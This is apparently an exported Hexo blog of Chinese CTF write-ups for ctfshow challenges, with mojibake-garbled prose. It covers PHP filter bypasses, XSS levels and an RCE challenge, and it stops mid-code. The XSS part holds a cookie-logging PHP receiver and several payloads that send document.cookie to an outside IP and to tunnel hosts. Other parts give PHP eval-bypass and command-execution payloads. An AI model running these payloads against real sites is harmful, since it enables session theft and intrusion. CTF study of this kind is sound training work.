class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>v1&#x3D;FilesystemIterator&amp;v2&#x3D;getcwd</p>
<p>é€šè¿‡æ–°å»ºFilesystemIteratorï¼Œå¯ä»¥æ˜¾ç¤ºå½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ç»“æ„ã€‚ç”±äºå‚æ•°å†…éƒ¨æœ‰ä¸ªæ‹¬å·ï¼Œæ‰€ä»¥ä¸èƒ½ä½¿ç”¨å­—ç¬¦ä¸²æ¥ç´¢å¼•è·¯å¾„ï¼Œè€Œæ˜¯è¦é€šè¿‡æ‹¼æ¥æ–¹æ³•getcwd()æ¥è·å–å½“å‰çš„è·¯å¾„</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">getcwd</span>().PHP_EOL;</span><br><span class="line">	<span class="keyword">echo</span> <span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="string">&#x27;./&#x27;</span>).PHP_EOL;</span><br><span class="line">	<span class="keyword">echo</span> <span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="title function_ invoke__">getcwd</span>());</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&gt;&gt;D:\PHP</span><br><span class="line">  index.php</span><br><span class="line">  index.php</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/Xxy605/article/details/110128544">(11æ¡æ¶ˆæ¯) CTFæŠ€å·§_Webâ€”â€”PHPç‰¹æ€§_ä½¿ç”¨æ–‡ä»¶ç³»ç»Ÿè¿­ä»£å™¨FilesystemIteratorå’Œgetcwd()æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ç»“æ„_Ho1aAsçš„åšå®¢-CSDNåšå®¢</a></p>
<h2 id="GLOBALSå…¨å±€å˜é‡"><a href="#GLOBALSå…¨å±€å˜é‡" class="headerlink" title="$GLOBALSå…¨å±€å˜é‡"></a>$GLOBALSå…¨å±€å˜é‡</h2><p>ä» PHP 8.1.0 èµ·ï¼Œä¸å†æ”¯æŒå¯¹æ•´ä¸ª $GLOBALS æ•°ç»„çš„å†™è®¿é—®ï¼š</p>
<p>$GLOBALS -å¼•ç”¨å…¨å±€ä½œç”¨åŸŸä¸­å¯ç”¨çš„å…¨éƒ¨å˜é‡</p>
<p>ä¸€ä¸ªåŒ…å«äº†å…¨éƒ¨å˜é‡çš„å…¨å±€ç»„åˆæ•°ç»„ã€‚å˜é‡çš„åå­—å°±æ˜¯æ•°ç»„çš„é”®ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function getFlag(&amp;$v1,&amp;$v2)&#123;</span><br><span class="line">    eval(&quot;$$v1 = &amp;$$v2;&quot;);</span><br><span class="line">    var_dump($$v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://www.php.net/manual/zh/reserved.variables.globals.php">PHP: $GLOBALS - Manual</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params">&amp;<span class="variable">$v1</span>,&amp;<span class="variable">$v2</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;$<span class="subst">$v1</span> = &amp;$<span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$$v1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">getFlag</span>(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<p>?v2&#x3D;GLOBALS&amp;v1&#x3D;ctfshow</p>
<h2 id="phpfuzz"><a href="#phpfuzz" class="headerlink" title="phpfuzz"></a>phpfuzz</h2><p>web115</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">function filter($num)&#123;</span><br><span class="line">    $num=str_replace(&quot;0x&quot;,&quot;1&quot;,$num);</span><br><span class="line">    $num=str_replace(&quot;0&quot;,&quot;1&quot;,$num);</span><br><span class="line">    $num=str_replace(&quot;.&quot;,&quot;1&quot;,$num);</span><br><span class="line">    $num=str_replace(&quot;e&quot;,&quot;1&quot;,$num);</span><br><span class="line">    $num=str_replace(&quot;+&quot;,&quot;1&quot;,$num);</span><br><span class="line">    return $num;</span><br><span class="line">&#125;</span><br><span class="line">$num=$_GET[&#x27;num&#x27;];</span><br><span class="line">if(is_numeric($num) and $num!==&#x27;36&#x27; and trim($num)!==&#x27;36&#x27; and filter($num)==&#x27;36&#x27;)&#123;</span><br><span class="line">    if($num==&#x27;36&#x27;)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &quot;hacker!!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;hacker!!!&quot;;</span><br><span class="line">&#125; hacker!!!</span><br></pre></td></tr></table></figure>

<p>fuzzè„šæœ¬</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">for($i = 0; $i&lt;129; $i++)&#123;</span><br><span class="line">	$num=chr($i).&#x27;36&#x27;;</span><br><span class="line">	if(trim($num)!==&#x27;36&#x27; &amp;&amp; is_numeric($num) &amp;&amp; $num!==&#x27;36&#x27;)&#123;</span><br><span class="line">		echo urlencode(chr($i)).&quot;\n&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="é™æ€ç±»è°ƒç”¨"><a href="#é™æ€ç±»è°ƒç”¨" class="headerlink" title="é™æ€ç±»è°ƒç”¨"></a>é™æ€ç±»è°ƒç”¨</h2><p>â€‹         web137 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class ctfshow</span><br><span class="line">&#123;</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        die(&quot;private class&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    static function getFlag()&#123;</span><br><span class="line">        echo file_get_contents(&quot;flag.php&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">call_user_func($_POST[&#x27;ctfshow&#x27;]);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>phpä¸­ -&gt;ä¸:: è°ƒç”¨ç±»ä¸­çš„æˆå‘˜çš„åŒºåˆ«<br>-&gt;ç”¨äºåŠ¨æ€è¯­å¢ƒå¤„ç†æŸä¸ªç±»çš„æŸä¸ªå®ä¾‹<br>::å¯ä»¥è°ƒç”¨ä¸€ä¸ªé™æ€çš„ã€ä¸ä¾èµ–äºå…¶ä»–åˆå§‹åŒ–çš„ç±»æ–¹æ³•</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfshow=ctfshow::getFlag</span><br></pre></td></tr></table></figure>

<p><strong>åœ¨PHPä¸­ï¼Œ0&#x3D;&#x3D;&#x3D;FALSEæ˜¯é”™è¯¯çš„</strong> ä¸æ˜¯å¼ºç­‰äº</p>
<p>stripos() å‡½æ•°æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®</p>
<p>preg_matchä¸è¯†åˆ«æ•°ç»„</p>
<p>stripos()å‡½æ•°å¯¹æ•°ç»„ä¸è¯†åˆ«ï¼Œé‡åˆ°æ•°ç»„ä¼šè¿”å›false</p>
<h2 id="ç»•è¿‡returnçš„æ–¹å¼"><a href="#ç»•è¿‡returnçš„æ–¹å¼" class="headerlink" title="ç»•è¿‡returnçš„æ–¹å¼"></a>ç»•è¿‡returnçš„æ–¹å¼</h2><p>phpä¸­æœ‰ä¸ªæœ‰æ„æ€çš„åœ°æ–¹ï¼Œæ•°å­—æ˜¯å¯ä»¥å’Œå‘½ä»¤è¿›è¡Œä¸€äº›è¿ç®—çš„ï¼Œä¾‹å¦‚ <code>1-phpinfo();</code>ç»“åˆå‡å·æ˜¯å¯ä»¥æ‰§è¡Œphpinfo()å‘½ä»¤çš„ã€‚ï¼ˆä¸ä¸€å®šæ˜¯å‡å·ï¼Œè¿˜æœ‰åŠ ã€ä¹˜ã€é™¤å·ï¼Œè‹¥ç”¨åŠ å·ã€‚è¦ç”¨<code>+</code>ï¼Œè¦è¿›è¡ŒURLç¼–ç ï¼Œè¿™æ˜¯ä¸ªç‰¹æ®Šå­—ç¬¦ï¼Œä¸è¿›è¡Œç¼–ç ä¼šå½“ä½œç©ºæ ¼ï¼‰</p>
]]></content>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshowxss</title>
    <url>/2023/02/26/xss/</url>
    <content><![CDATA[<p> xss</p>
<span id="more"></span>

<p>åå°„å‹XSSå¤§å¤šæ•°æ˜¯ç”¨æ¥ç›—å–ç”¨æˆ·çš„Cookieä¿¡æ¯ã€‚</p>
<h1 id="web316-326ï¼ˆåå°„å‹ï¼‰"><a href="#web316-326ï¼ˆåå°„å‹ï¼‰" class="headerlink" title="web316-326ï¼ˆåå°„å‹ï¼‰"></a>web316-326ï¼ˆåå°„å‹ï¼‰</h1><p>åœ¨æœ¬åœ°å»ºä¸€ä¸ªç½‘ç«™ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line"><span class="variable">$log</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;cookie.txt&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$log</span>, <span class="variable">$cookie</span> . <span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$log</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;document.location.href=&#x27;http://101.43.182.125:7000/&#x27;+document.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure>



<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;è‡ªå·±ç½‘ç«™ip?cookie=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>å³å¯åœ¨è‡ªå·±ç½‘ç«™ç”Ÿæˆä¸€ä¸ªcookie.txtæ–‡æ¡£å³æ˜¯flag</p>
<p>flag&#x3D;ctfshow{cbc17e98-ce5c-42a6-90f1-a2a5fb0bc724}</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;http://ä½ çš„å…¬ç½‘ip:ç«¯å£å·/&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="keyword">var</span> img = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;img&quot;</span>);img.<span class="property">src</span> = <span class="string">&quot;http://ä½ çš„å…¬ç½‘ip:ç«¯å£å·/?cookie=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;http://ä½ çš„å…¬ç½‘ip:ç«¯å£å·/&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">location.<span class="property">href</span>=<span class="string">&#x27;http://ä½ çš„å…¬ç½‘ip:ç«¯å£å·/&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">&lt;input onfocus=&quot;window.open(&#x27;http://ä½ çš„å…¬ç½‘ip:ç«¯å£å·/&#x27;+document.cookie)&quot; autofocus&gt;</span><br><span class="line"></span><br><span class="line">&lt;svg onload=&quot;window.open(&#x27;http://ä½ çš„å…¬ç½‘ip:ç«¯å£å·/&#x27;+document.cookie)&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe onload=&quot;window.open(&#x27;http://ä½ çš„å…¬ç½‘ip:ç«¯å£å·/&#x27;+document.cookie)&quot;&gt;&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line">&lt;body onload=&quot;window.open(&#x27;http://ä½ çš„å…¬ç½‘ip:ç«¯å£å·/&#x27;+document.cookie)&quot;&gt;</span><br></pre></td></tr></table></figure>

<h3 id="web320-326"><a href="#web320-326" class="headerlink" title="web320-326"></a>web320-326</h3><p>è¿‡æ»¤ç©ºæ ¼    &#x2F;**&#x2F;<br> payloadè¯­å¥</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;body/onload=<span class="string">&quot;window.location.href=&#x27;http://fe6e643.cpolar.top/2.php?c=&#x27;+document.cookie&quot;</span>&gt;</span><br></pre></td></tr></table></figure>

<h3 id="web328"><a href="#web328" class="headerlink" title="web328"></a>web328</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;https://16d59916.cpolar.cn/test.php?cookie=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="web329"><a href="#web329" class="headerlink" title="web329"></a>web329</h2><p>æ¯ä¸€æ¬¡ç®¡ç†å‘˜çš„cookieä¼šæ”¹å˜ï¼Œæ‰€ä»¥æ— æ³•ä½¿ç”¨ä¸Šè¿°çš„æ–¹å¼å»è·å¾—cookie,,æ–¹æ³•æš‚æ— </p>
<p>ä¸€ã€å­˜å‚¨å‹XSSç®€ä»‹<br>ï¼ˆä¸€ï¼‰å­˜å‚¨å‹XSSçš„æ¦‚å¿µ<br>å­˜å‚¨å‹XSSåˆç§°æŒä¹…å‹XSSï¼Œæ”»å‡»è„šæœ¬å°†è¢«æ°¸ä¹…åœ°å­˜æ”¾åœ¨ç›®æ ‡æœåŠ¡å™¨çš„æ•°æ®åº“æˆ–æ–‡ä»¶ä¸­ï¼Œå…·æœ‰å¾ˆé«˜çš„éšè”½æ€§ã€‚åå°„å‹XSSçš„è¢«æ”»å‡»å¯¹è±¡ä¸€èˆ¬æ˜¯æ”»å‡»è€…å»å¯»æ‰¾çš„ï¼Œå°±æ¯”å¦‚è¯´ï¼šä¸€ä¸ªæ”»å‡»è€…æƒ³ç›—å–Açš„è´¦å·ï¼Œé‚£ä¹ˆæ”»å‡»è€…å°±å¯ä»¥å°†ä¸€ä¸ªå«æœ‰åå°„å‹XSSçš„ç‰¹åˆ¶URLé“¾æ¥å‘é€ç»™Aï¼Œç„¶åç”¨èŠ±è¨€å·§è¯­è¯±éª—Aç‚¹å‡»é“¾æ¥ã€‚å½“Aä¸å°å¿ƒç‚¹è¿›å»æ—¶ï¼Œå°±ä¼šç«‹å³å—åˆ°XSSæ”»å‡»ã€‚è¿™ç§æ”»å‡»æ–¹å¼éœ€è¦ä¸€ç‚¹éª—æœ¯ï¼Œæ‰€ä»¥è¿™ç§æ”»å‡»èŒƒå›´ä¸æ˜¯ç‰¹åˆ«çš„å¹¿ï¼Œå¹¶ä¸”æäº¤æ¼æ´æ—¶è¦ä¹ˆå¹³å°ä¸è®¤ï¼Œè¦ä¹ˆä¼šè¢«è®¤å®šä¸ºä½å±æ¼æ´ã€‚<br>å­˜å‚¨å‹XSSå¯ä»¥é‡‡ç”¨å¹¿æ’’ç½‘çš„æ–¹å¼ï¼Œå°±æ˜¯æ”»å‡»è€…å°†å­˜å‚¨å‹XSSä»£ç å†™è¿›ä¸€äº›æœ‰XSSæ¼æ´çš„ç½‘ç«™ä¸Šï¼Œåªè¦æœ‰ç”¨æˆ·è®¿é—®è¿™ä¸ªé“¾æ¥å°±ä¼šè‡ªåŠ¨ä¸­æ‹›ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥çœ‹å‡ºï¼Œå­˜å‚¨å‹XSSçš„å±å®³æ€§æ›´å¤§ï¼ŒèŒƒå›´æ›´å¹¿ï¼Œå¯ä»¥ä¸éœ€è¦å¯»æ‰¾è¢«æ”»å‡»å¯¹è±¡ï¼Œåªè¦å­˜å‚¨å‹XSSåœ¨æœåŠ¡å™¨ä¸Šå°±èƒ½å®æ–½æ”»å‡»ã€‚æ‰€ä»¥æäº¤çš„å­˜å‚¨å‹XSSè¯„çº§ä¸€èˆ¬ä¸ºä¸­å±æ¼æ´ã€‚</p>
<p>ï¼ˆäºŒï¼‰å­˜å‚¨å‹XSSæ”»å‡»è¿‡ç¨‹<br>è¿™ç§æ”»å‡»å¤šè§äºè®ºå›ã€åšå®¢å’Œç•™è¨€æ¿ã€‚æ”»å‡»è€…åœ¨å‘å¸–çš„è¿‡ç¨‹ä¸­ï¼Œå°†æ¶æ„è„šæœ¬è¿åŒæ­£å¸¸ä¿¡æ¯ä¸€èµ·æ³¨å…¥å¸–å­çš„å†…å®¹ä¸­ã€‚éšç€å¸–å­è¢«æœåŠ¡å™¨å­˜å‚¨ä¸‹æ¥ï¼Œæ¶æ„è„šæœ¬ä¹Ÿæ°¸ä¹…åœ°è¢«å­˜æ”¾åœ¨æœåŠ¡å™¨çš„åç«¯æ•°æ®åº“ä¸­ã€‚å½“å…¶ä»–ç”¨æˆ·æµè§ˆè¿™ä¸ªè¢«æ³¨å…¥äº†æ¶æ„è„šæœ¬çš„å¸–å­æ—¶ï¼Œæ¶æ„è„šæœ¬ä¼šåœ¨ä»–ä»¬çš„æµè§ˆå™¨ä¸­å¾—åˆ°è§¦å‘ã€‚<br>ä¾‹å¦‚ï¼Œæ”»å‡»è€…åœ¨ç•™è¨€æ¿ä¸­åŠ å…¥ä»¥ä¸‹</p>
<script>alert(1)</script>
<p>è¿™æ ·å½“å…¶ä»–ç”¨æˆ·è®¿é—®ç•™è¨€æ¿æ—¶ï¼Œå°±ä¼šçœ‹åˆ°ä¸€ä¸ªå¼¹çª—ã€‚å¯ä»¥çœ‹åˆ°ï¼Œå­˜å‚¨å‹XSSçš„æ”»å‡»æ–¹å¼èƒ½å¤Ÿå°†æ¶æ„ä»£ç æ°¸ä¹…åœ°å­˜å…¥æ•°æ®åº“æˆ–è€…æ–‡ä»¶ä¸­ï¼Œç›¸å½“äºå°†ä»£ç åµŒå…¥ä¸€ä¸ªé¡µé¢ä¸­ï¼Œæ‰€æœ‰è®¿é—®è¿™ä¸ªé¡µé¢çš„ç”¨æˆ·éƒ½å°†æˆä¸ºå—å®³è€…ã€‚å¦‚æœæˆ‘ä»¬èƒ½å¤Ÿè°¨æ…å¯¹å¾…ä¸æ˜é“¾æ¥ï¼Œé‚£ä¹ˆåå°„å‹XSSæ”»å‡»å°†æ²¡æœ‰å¤šå¤§ä½œä¸ºï¼Œè€Œå­˜å‚¨å‹XSSåˆ™ä¸åŒï¼Œç”±äºå®ƒæ³¨å…¥åœ¨ä¸€äº›æˆ‘ä»¬éå¸¸ä¿¡ä»»çš„é¡µé¢ä¸­ï¼Œå› æ­¤æ— è®ºæˆ‘ä»¬å¤šä¹ˆå°å¿ƒï¼Œéƒ½éš¾å…ä¼šå—åˆ°æ”»å‡»ã€‚</p>
<h2 id="web330"><a href="#web330" class="headerlink" title="web330"></a>web330</h2><p>å‘ç°ä¸€ä¸ªä¿®æ”¹å¯†ç çš„ç•Œé¢</p>
<p>è‡ªå·±éšä¾¿æ³¨å†Œä¸€ä¸ªè´¦å·ï¼Œä¿®æ”¹å¯†ç ï¼ŒæŠ“åŒ…çœ‹è§</p>
<p>GET &#x2F;api&#x2F;change.php?p&#x3D;qwe HTTP&#x2F;1.1</p>
<p>ç”¨ä¸‹é¢è¿™å¥è¯ä½œä¸ºè´¦å·å¯†ç æ³¨å†Œä¸€ä¸ªè´¦å·</p>
<script>window.open('http://127.0.0.1/api/change.php?p=123')</script>

<p>admin 123ç™»å½•æ‰“å¼€æŠ“åŒ…çœ‹responseç”¨æˆ·ç®¡ç†å³å¯å‘ç°flagï¼Œè¦ç”¨æŠ“åŒ…ï¼Œä¸ç„¶ä¼šé‡å®šå‘ï¼Œçœ‹ä¸åˆ°è¿™ä¸ªã€‚å¯ä»¥ä»responseä¸­çœ‹åˆ°flag</p>
<h2 id="web331"><a href="#web331" class="headerlink" title="web331"></a>web331</h2><h2 id="web332"><a href="#web332" class="headerlink" title="web332"></a>web332</h2><p>é€»è¾‘æ¼æ´è½¬è´¦è´Ÿæ•°é‡‘é¢å³å¯-100000è¦æ˜¯æ”¯ä»˜å®æœ‰è¿™ä¸ªæ¼æ´å°±å¥½äº†</p>
<p>è´­ä¹°flag</p>
<h2 id="web333"><a href="#web333" class="headerlink" title="web333"></a>web333</h2><p>ä¸èƒ½è½¬è´Ÿæ•°äº†ä½†æ˜¯å¯ä»¥ç»™è‡ªå·±è½¬ï¼Œbpçˆ†ç ´ä¸€ä¸‹å§ï¼Œpayload set 1;</p>
<p>payloadtype number;</p>
<p>from 4  to 1000;</p>
<p>åˆ·æ–°çœ‹åˆ°æœ‰é’±ä¹°flag</p>
<p>ctfshow{acc33993-f2a7-4216-b242-68b61f84e89a}</p>
]]></content>
      <categories>
        <category>ctfshow</category>
      </categories>
      <tags>
        <tag>ctfshow</tag>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title>rceæé™æŒ‘æˆ˜</title>
    <url>/2023/04/05/rce%E6%9E%81%E9%99%90%E6%8C%91%E6%88%98/</url>
    <content><![CDATA[<p>ctfshow rceæé™æŒ‘æˆ˜</p>
<p>ä¸èƒ½ç”¨å­—æ¯æ•°å­—æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡<strong>å¼‚æˆ–ï¼Œå–åï¼Œè‡ªå¢è‡ªå‡ï¼Œæˆ–</strong>ç­‰ä½è¿ç®—åˆ©ç”¨ç‰¹æ®Šå­—ç¬¦æ„é€ å‡ºå­—æ¯æ•°å­—ï¼Œå†åˆ©ç”¨<strong>phpåŠ¨æ€å‡½æ•°å</strong>çš„ç‰¹æ€§æ¥æ„é€ webshellã€‚</p>
<p>â€‹    <span id="more"></span></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = &#x27;&#x27;.[];</span><br><span class="line">echo($a);//ç»“æœå°±ä¸ºarray</span><br><span class="line">$_=[].[]; //ä¿©æ•°ç»„æ‹¼æ¥å¼ºè¡Œè¿”å›ArrayArray,è¿™é‡Œä¸€ä¸ªçŸ­æ çš„å€¼ä¹Ÿå°±æ˜¯ArrayArray</span><br><span class="line">PHPåœ¨è¿›è¡Œè®¡ç®—çš„æ—¶å€™è®¤ä¸ºç»“æœæ˜¯æ— é™å¤§æ—¶ä»–ä¼šè¿”å›ç»“æœæ˜¯:INF ï¼ˆ Infinite)</span><br><span class="line">è¿™é‡Œä¸¾ä¸ªåˆ—ï¼šecho (1/0);  //å°±ä¼šè¾“å‡ºINF</span><br><span class="line">PHPè¿›è¡Œè®¡ç®—çš„æ—¶å€™è®¤ä¸ºä¸€ä¸ªæ•°è¶…å‡ºInfiniteï¼Œé‚£å°±æ˜¯: NAN( not-a-number)</span><br><span class="line">è¿™é‡Œä¸¾ä¸ªä¾‹ï¼šecho (a/a); //å°±ä¼šè¾“å‡ºNAN</span><br></pre></td></tr></table></figure>

<h2 id="rceæé™æŒ‘æˆ˜1"><a href="#rceæé™æŒ‘æˆ˜1" class="headerlink" title="rceæé™æŒ‘æˆ˜1"></a>rceæé™æŒ‘æˆ˜1</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="variable">$code</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;(&quot;</span>,<span class="string">&quot;æ‹¬å·&quot;</span>,<span class="variable">$code</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;ç‚¹&quot;</span>,<span class="variable">$code</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>payloadï¼šecho <code>cat /f*</code>;</p>
<h2 id="rceæé™æŒ‘æˆ˜2"><a href="#rceæé™æŒ‘æˆ˜2" class="headerlink" title="rceæé™æŒ‘æˆ˜2"></a>rceæé™æŒ‘æˆ˜2</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title 